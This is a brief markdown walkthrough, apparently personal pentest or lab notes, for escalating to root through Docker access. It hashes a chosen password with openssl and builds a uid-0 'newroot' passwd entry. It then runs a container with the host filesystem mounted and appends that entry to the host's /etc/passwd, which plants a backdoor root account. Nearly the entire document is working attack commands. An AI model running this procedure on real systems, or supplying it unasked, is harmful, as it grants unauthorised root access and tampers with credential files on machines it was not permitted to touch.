# Docker PrivEsc

### Step 1: Prepare the new root user

```
openssl passwd -1 -salt evil newrootpass
```

### Step 2: Add salted has along with rest of passwd info to file called new\_account

```
newroot:$1$evil$eu2ySQGNgNghQm4ASTnKa.:0:0:root:/root:/bin/bash
```

### Step 3: Create docker container for exploit

```
docker run -tid -v /:/mnt/ --name flast101 alpine
```

in my case alpine wasn't available. I ran the command `docker images` and found an image named bash, so in my particular scenario my command was `docker run -tid -v /:/mnt/ --name flast101 bash`

### Step 4: Execute newly created docker container

```
docker exec -ti flast101 sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
```
